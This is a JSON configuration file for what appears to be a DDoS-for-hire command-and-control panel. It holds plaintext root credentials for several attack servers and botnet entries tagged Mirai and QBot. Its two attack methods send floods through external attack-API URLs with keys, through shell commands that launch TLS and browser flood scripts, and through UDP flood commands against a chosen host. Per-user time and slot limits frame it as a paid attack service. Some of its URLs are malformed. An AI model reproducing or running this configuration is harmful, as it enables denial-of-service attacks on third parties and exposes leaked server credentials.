{
    "server_list": [
        {
            "enabled": false,
            "tag": "LAYER 4 #1",
            "configuration": {
                "ip": "1.1.1.1",
                "port": 22,
                "username": "root",
                "password": "password"
            }
        },
        {
            "enabled": true,
            "tag": "LAYER 7 #1",
            "configuration": {
                "ip": "94.156.248.15",
                "port": 22,
                "username": "root",
                "password": "uKXCfpEj8QF3xiHCUsoY"
            }
        },
        {
            "enabled": true,
            "tag": "LAYER 7 #2",
            "configuration": {
                "ip": "158.178.237.239",
                "port": 22,
                "username": "root",
                "password": "usnexus1111"
            }
        },
        {
            "enabled": true,
            "tag": "LAYER 7 #3",
            "configuration": {
                "ip": "92.249.48.9",
                "port": 22,
                "username": "root",
                "password": "usnexus1111"
            }
        },
        {
            "enabled": true,
            "tag": "LAYER 7 #4",
            "configuration": {
                "ip": "170.64.161.88",
                "port": 22,
                "username": "root",
                "password": "usnexus1111"
            }
        }
    ],
    "botnet_list": [
        {
            "enabled": false,
            "tag": "MIRAI",
            "settings": {
                "note": "These settings below are executed in order: 'login_word' -> 'initial_enter' -> 'tos_page'",
                "login_word": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "word": "botnet"
                },
                "initial_enter": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500
                },
                "tos_page": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "command": "y"
                },
                "sleep_in_milliseconds": {
                    "before_username": 1000,
                    "before_password": 1000,
                    "before_command": 1000
                }
            },
            "config": {
                "host": "8.8.8.8",
                "port": 22,
                "username": "username",
                "password": "password"
            }
        },
        {
            "enabled": false,
            "tag": "QBOT",
            "settings": {
                "note": "These settings below are executed in this order: 'login_word' -> 'initial_enter' -> 'tos_page'",
                "login_word": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "word": "botnet"
                },
                "initial_enter": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500
                },
                "tos_page": {
                    "enabled": true,
                    "sleep_in_milliseconds_before": 500,
                    "command": "y"
                },
                "sleep_in_milliseconds": {
                    "before_username": 1000,
                    "before_password": 1000,
                    "before_command": 1000
                }
            },
            "config": {
                "host": "1.1.1.1",
                "port": 22,
                "username": "username",
                "password": "password"
            }
        }
    ],
    "attacks": [
        {
            "method_name": "!tls-kill",
            "api_funnel": {
                "enabled": true,
                "links": [
                    {
                        "link": "http://92.249.48.9:1337/api/attack?username=usnexus1111&key=usnexus1111&host={HOST}&port={PORT}&time={TIME}&method=TLS-KILL",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.48.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=NUKE",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.48.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=BYPASS",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.48.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=KILLER",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.48.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.48.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=TLSX",
                        "max_time": 1200,
                        "enabled": true
                    }
                ]
            },
            "server_funnel": {
                "enabled": true,
                "note": "Only enable one of the two options below. ('all' or 'elect')",
                "all": {
                    "enabled": true,
                    "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro {HOST} {TIME} 120 120 http.txt"
                },
                "select": {
                    "enabled": true,
                    "servers": [
                        {
                            "tag": "LAYER 7 #1",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-kill.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node browser {HOST} {TIME} 120 90 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tlsx.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #1",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-kill.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node browser {HOST} {TIME} 120 90 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tlsx.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #4",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        }
                    ]
                }
            },
            "botnet_funnel": {
                "enabled": false,
                "note": "Only enable one of the two options below. ('all' or 'elect')",
                "all": {
                    "enabled": true,
                    "command": ".attack UDP {HOST} {PORT} {TIME}"
                },
                "select": {
                    "enabled": false,
                    "botnets": [
                        {
                            "tag": "QBOT",
                            "command": ".udp {HOST} {TIME} -dport={PORT}",
                            "enabled": true
                        },
                        {
                            "tag": "MIRAI",
                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
                            "enabled": true
                        }
                    ]
                }
            },
            "configuration": {
                "method_slots": {
                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
                    "max": 1000,
                    "enabled": false
                },
                "method_min_time": {
                    "note": "Enabling this will require users to attack for at least the time below.",
                    "time": 1,
                    "enabled": false
                },
                "method_max_time": {
                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
                    "hard": {
                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
                        "time": 800,
                        "enabled": true
                    },
                    "soft": {
                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
                        "time": 120,
                        "enabled": false
                    }
                }
            },
            "method_status": {
                "method_is_enabled": true,
                "settings": {
                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
                    "cnc_access_only": false,
                    "api_access_only": false
                },
                "restrictions": {
                    "what_targets_to_allow": {
                        "note": "Only enable at least one of the options below. (Note: You can enable them all.)",
                        "ip_address": false,
                        "url": true,
                        "domain": false,
                        "subnet": false,
                        "comma_separated_ip_addresses": false
                    },
                    "method_group": {
                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
                        "method_group_name": "Main Network",
                        "require_method_group_role": false
                    },
                    "port_settings": {
                        "note": "Only enable one of the two options below. ('method_port_range' or 'method_port_whitelist') (Note: You can have both disabled.)",
                        "method_port_range": {
                            "note": "Enabling this will only allow users to attack between the two ports below.",
                            "min_port": 53,
                            "max_port": 80,
                            "enabled": false
                        },
                        "method_port_whitelist": {
                            "note": "Enabling this will only allow users to attack the ports below.",
                            "ports": [],
                            "enabled": false
                        }
                    },
                    "as_number_whitelist": {
                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
                        "enabled": false,
                        "as_number": []
                    },
                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
                    "vip": false,
                    "private": {
                        "note": "Enabling this will only allow the users below to use this method.",
                        "enabled": false,
                        "users": []
                    }
                }
            }
        },
    {
            "method_name": "!udp-vip",
            "api_funnel": {
                "enabled": true,
                "links": [
                    {
                        "link": "https://api.chunkyc2.com/api/attack?host={HOST}&port={PORT}&time={TIME}&method=udp-vip&key=1234&username=darkc2",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.4s8.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=NUKE",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.48s9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=BYPASS",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.s8.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=KILLER",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.s48.9:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
                        "max_time": 1200,
                        "enabled": true
                    },
                    {
                        "link": "http://92.249.48.s:8080/api?key=jxdn&host={HOST}&port={PORT}&time={TIME}&method=TLSX",
                        "max_time": 1200,
                        "enabled": true
                    }
                ]
            },
            "server_funnel": {
                "enabled": false,
                "note": "Only enable one of the two options below. ('all' or 'elect')",
                "all": {
                    "enabled": true,
                    "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro {HOST} {TIME} 120 120 http.txt"
                },
                "select": {
                    "enabled": true,
                    "servers": [
                        {
                            "tag": "LAYER 7 #1",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-kill.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node browser {HOST} {TIME} 120 90 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tlsx.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #2",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #1",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-kill.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node browser {HOST} {TIME} 120 90 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #3",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tlsx.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        },
                        {
                            "tag": "LAYER 7 #4",
                            "command": "cd /methods; screen -dmS timeout {TIME} node tls-pro.js {HOST} {TIME} 120 120 http.txt",
                            "enabled": true
                        }
                    ]
                }
            },
            "botnet_funnel": {
                "enabled": false,
                "note": "Only enable one of the two options below. ('all' or 'elect')",
                "all": {
                    "enabled": true,
                    "command": ".attack UDP {HOST} {PORT} {TIME}"
                },
                "select": {
                    "enabled": false,
                    "botnets": [
                        {
                            "tag": "QBOT",
                            "command": ".udp {HOST} {TIME} -dport={PORT}",
                            "enabled": true
                        },
                        {
                            "tag": "MIRAI",
                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
                            "enabled": true
                        }
                    ]
                }
            },
            "configuration": {
                "method_slots": {
                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
                    "max": 1000,
                    "enabled": false
                },
                "method_min_time": {
                    "note": "Enabling this will require users to attack for at least the time below.",
                    "time": 1,
                    "enabled": false
                },
                "method_max_time": {
                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
                    "hard": {
                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
                        "time": 80,
                        "enabled": true
                    },
                    "soft": {
                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
                        "time": 120,
                        "enabled": false
                    }
                }
            },
            "method_status": {
                "method_is_enabled": true,
                "settings": {
                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
                    "cnc_access_only": false,
                    "api_access_only": false
                },
                "restrictions": {
                    "what_targets_to_allow": {
                        "note": "Only enable at least one of the options below. (Note: You can enable them all.)",
                        "ip_address": true,
                        "url": true,
                        "domain": false,
                        "subnet": false,
                        "comma_separated_ip_addresses": false
                    },
                    "method_group": {
                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
                        "method_group_name": "Main Network",
                        "require_method_group_role": false
                    },
                    "port_settings": {
                        "note": "Only enable one of the two options below. ('method_port_range' or 'method_port_whitelist') (Note: You can have both disabled.)",
                        "method_port_range": {
                            "note": "Enabling this will only allow users to attack between the two ports below.",
                            "min_port": 53,
                            "max_port": 80,
                            "enabled": false
                        },
                        "method_port_whitelist": {
                            "note": "Enabling this will only allow users to attack the ports below.",
                            "ports": [],
                            "enabled": false
                        }
                    },
                    "as_number_whitelist": {
                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
                        "enabled": false,
                        "as_number": []
                    },
                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
                    "vip": false,
                    "private": {
                        "note": "Enabling this will only allow the users below to use this method.",
                        "enabled": false,
                        "users": []
                    }
                }
            }
        }
    ]
}
